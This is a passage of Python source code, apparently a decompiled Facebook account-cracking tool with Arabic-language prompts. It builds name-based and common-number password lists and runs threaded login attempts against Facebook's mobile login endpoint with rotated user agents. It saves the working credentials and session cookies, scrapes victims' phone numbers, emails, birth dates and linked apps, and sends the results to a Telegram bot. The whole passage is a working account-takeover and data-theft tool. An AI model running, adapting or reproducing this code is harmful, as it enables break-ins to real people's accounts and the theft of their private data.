    print()
    if _jembot_ in ('',):
        print(' Chouse ')
        back()
    elif _jembot_ in ('y', 'Y'):
        taplikasi.append('ya')
    else:
        taplikasi.append('no')
    pwplus = input('𝐕𝐈𝐏 - باسورد يدوي (T عشوائي)( Y/T ) :')
    print(B + '~,~' * 15)
    os.system('clear')
    banner()
    if pwplus in ('y', 'Y'):
        pwpluss.append('ya')
        cetak(nel(' 1122334455,5544332211,..... '))
        pwku = input('[➣_] PASTE PASS : ')
        pwkuh = pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')
    passwrd()


def passwrd():
    print()
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf = yuzong.split('|')[0]
            nmf = yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(frs + frs)
                    pwv.append(frs + '123')
                    pwv.append(frs + ' ' + frs)
                    pwv.append('1122334455')
                    pwv.append('12345678')
                    pwv.append('123456')
                    pwv.append(frs + '12')
                    pwv.append(frs + '1988')
                    pwv.append(frs + '1989')
                    pwv.append(frs + '1990')
                    pwv.append(frs + '1991')
                    pwv.append(frs + '1992')
                    pwv.append(frs + '1993')
                    pwv.append(frs + '1994')
                    pwv.append(frs + '1995')
                    pwv.append(frs + '112233')
                    pwv.append(frs + '1234')
                    pwv.append(frs + '12345')
                    pwv.append(frs + '123456')
                    pwv.append('112233')
                    pwv.append('11223344')
                    pwv.append('1122')
                    pwv.append('1234567')
                    pwv.append('12345678')
                    pwv.append('1985')
                    pwv.append(frs + '123456789')
                    pwv.append(frs + '1234567890')
                    pwv.append(frs + '1986')
                    pwv.append('123' + frs)
                    pwv.append('1234' + frs)
            elif len(frs) < 3:
                pwv.append(nmf)
            else:
                pwv.append(nmf)
                pwv.append('firstfirst')
                pwv.append('firstlast')
                pwv.append(frs + frs)
                pwv.append(frs + 'frist')
                pwv.append(frs + 'last')
                pwv.append(frs + '1999')
                pwv.append(frs + '1998')
                pwv.append(frs + '1997')
                pwv.append(frs + '1996')
                pwv.append(frs + '1995')
                pwv.append(frs + '1994')
                pwv.append(frs + '1993')
                pwv.append(frs + '1992')
                pwv.append(frs + '1991')
                pwv.append(frs + '1990')
                pwv.append(frs + '1998')
                pwv.append(frs + '1999')
                pwv.append(frs + '2004')
                pwv.append(frs + '2006')
                pwv.append(frs + '2003')
                pwv.append(frs + '2002')
                pwv.append(frs + '2001')
                pwv.append('aaaassss')
                pwv.append('00998877')
                pwv.append('aaaazzzz')
                pwv.append('11223344')
                pwv.append('112233445566')
                pwv.append('1122334455')
                pwv.append('aaaassss')
                pwv.append('00998877')
                pwv.append('aaaazzzz')
                pwv.append('11223344')
                pwv.append('qqwweerr')
                pwv.append('07700770')
                pwv.append('5432154321')
                pwv.append('5544332211')
                pwv.append('12345qwert')
                pwv.append('1q2w3e4r5t')
                pwv.append('qqwweerr')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            pool.submit(crack, idf, pwv)
    print('')
    print(f'''[{b}•{x}]{h} OK : {h}%s ''' % ok)
    print(f'''{x}[{b}•{x}]{k} CP : {k}%s{x} ''' % cp)
    print('')
    print('تم الاكمال هل تريد الرجوع ( Y/n ) ? ')
    woi = input('𝐕𝐈𝐏 - اختر ماذا تريد : ')
    if woi in ('y', 'Y'):
        os.system('clear')
        back()
    else:
        print(f'''\t{x}>>{k} الى القاء تجربة ممتعة لك في الاداة{x} << ''')
        time.sleep(2)
        exit()


def crack(idf, pwv):
    global cp, ok, ok, loop
    bi = random.choice([
        u,
        k,
        kk,
        b,
        h,
        hh])
    pers = loop * 100 / len(id2)
    fff = '%'
    print('\r%s [🥰𝐕𝐈𝐏🥰]- %s/%s  [OK] %s /اميرة رتاج👑👑/ [CP] %s %s%s%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), end=' ')
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        
        try:
            tix = time.time()
            ses.headers.update({
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'accept-encoding': 'gzip, deflate br',
                'referer': 'https://m.facebook.com/',
                'sec-fetch-dest': 'document',
                'sec-fetch-user': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'x-requested-with': 'mark.via.gp',
                'dnt': '1',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'user-agent': ua2,
                'upgrade-insecure-requests': '1',
                'Host': 'm.facebook.com' })
            p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa = {
                'next': 'https://developers.facebook.com/tools/debug/accesstoken/',
                'pass': pw,
                'flow': 'login_no_pin',
                'uid': idf,
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
                'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1) }
            ses.headers.update({
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'accept-encoding': 'gzip, deflate br',
                'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                'sec-fetch-dest': 'document',
                'sec-fetch-user': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'x-requested-with': 'mark.via.gp',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'user-agent': ua,
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://m.facebook.com',
                'upgrade-insecure-requests': '1',
                'cache-control': 'max-age=0',
                'Host': 'm.facebook.com' })
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
            if 'checkpoint' in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    akun.append(idf + '|' + pw)
                    ceker(idf, pw)
                else:
                    print('\n')
                    statuscp = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✖️\n▬▬▬▬▬▬▬▬✯سكيور تقلك رتاج✯▬▬▬▬▬▬.\n\'\n[🔴] BAD ACCOUNT\n──────────\n[-] - EMAIL : {idf}\n\n[-] - PASSWERD : {pw}\n──────────\nBY : @\n\t\t\t\t\t\n\t\t\t\t\t'''
                    statuscp1 = nel(statuscp, style='red')
                    cetak(nel(statuscp1, title='سكيور حساب رتاج'))
                    open('حساب سكيور رتاج/' + cpc, 'a').write(idf + '|' + pw + '\n')
                    akun.append(idf + '|' + pw)
                    cp += 1
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statuscp))

            if 'c_user' in ses.cookies.get_dict().keys():
                headapp = {
                    'user-agent': 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+' }
                if 'no' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = ';'.join((lambda x: [ '%s=%s' % (key, value) for key, value in x ])(ses.cookies.get_dict().items()))
                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                    print('\n')
                    statusok = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺\n▬▬▬▬▬▬▬▬✯رتاج جبتلك حساب✯▬▬▬▬▬▬\n\n[🟢] GOOD ACCOUNT\n──────────\n[-] - EMAIL : {idf}\n\n[-] - PASSWERD : {pw}\n\n[-] - Cookies : {kuki}\n──────────\nBY : @\n\t\t\t\t\t\n\t\t\t\t\t'''
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title=' رتاج جبتلك حساب'))
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statusok))
            
    
                if 'ya' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = ';'.join((lambda x: [ '%s=%s' % (key, value) for key, value in x ])(ses.cookies.get_dict().items()))
                    open('جبتلك حساب رتاج/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                    user = idf
                    infoakun = ''
                    session = requests.Session()
                    get_id = session.get('https://m.facebook.com/profile.php', cookies=coki, headers=headapp).text
                    nama = re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]
                    response = session.get('https://m.facebook.com/profile.php?v=info', cookies=coki, headers=headapp).text
                    response2 = session.get('https://m.facebook.com/profile.php?v=friends', cookies=coki, headers=headapp).text
                    response3 = session.get(f'''https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_''', cookies=coki, headers=headapp).text
                    response4 = session.get(f'''https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr''', cookies=coki, headers=headapp).text

                    try:
                        nomer = re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
                    except:
                        nomer = ''
                    
                    try:
                        email = re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
                    except:
                        email = ''
                    
                    try:
                        ttl = re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
                    except:
                        ttl = ''
                    
                    try:
                        teman = re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
                    except:
                        teman = ''
                    
                    try:
                        pengikut = re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
                    except:
                        pengikut = ''
                    
                    try:
                        tahun = ''
                        cek_thn = re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
                        for nenen in cek_thn:
                            tahun += nenen + ', '
                    except:pass
                    infoakun += f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✔️     \t\t▬▬▬▬▬▬▬▬✯رتاج جبتلك حياب✯▬▬▬▬▬▬.\n\n[🟢] GOOD ACCOUNT\n──────────\n[-]  - Email : {idf}\n[-] - Passwerd : {pw}\n[-] - Cookies : {kuki}\n\n──────────\n[-] - @'''
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(infoakun))
                    (hit1, hit2) = (0, 0)
                    cek = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=coki, headers=headapp).text
                    cek2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', cookies=coki, headers=headapp).text
                    if 'Diakses menggunakan Facebook' in re.findall('\\<title\\>(.*?)<\\/title\\>', str(cek)):
                        infoakun += 'Aplikasi Yang Terkait*\n'
                        if 'Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.' in cek:
                            infoakun += 'Tidak Ada Aplikasi Aktif Yang Terkait *\n'
                        else:
                            infoakun += '\tAplikasi Aktif : \n'
                            apkAktif = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek))
                            ditambahkan = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek))
                            for muncul in apkAktif:
                                hit1 += 1
                                infoakun += f'''\t\t[{hit1}] {muncul} {ditambahkan[hit2]}\n'''
                                hit2 += 1
                        if 'Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau' in cek2:
                            infoakun += '\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n'
                        else:
                            (hit1, hit2) = (0, 0)
                            infoakun += '\tAplikasi Kedaluwarsa :\n'
                            apkKadaluarsa = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek2))
                            kadaluarsa = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek2))
                            for muncul in apkKadaluarsa:
                                hit1 += 1
                                infoakun += f'''\t\t[{hit1}] {muncul} {kadaluarsa[hit2]}\n'''
                                hit2 += 1
                    print('\n')
                    statusok = f'''\n   \n{infoakun}\n\t\t\t\t\t'''
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='جبتلك حساب رتاج'))
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1

def O():
    try:
        os.remove('ID.txt')
        os.remove('ok.coki.txt')
        os.remove('.token.txt')
        os.remove('.cok.txt')
    except:exit()

if __name__ == '__main__':
    DYNO()
    
#by to =('@CP_OK2')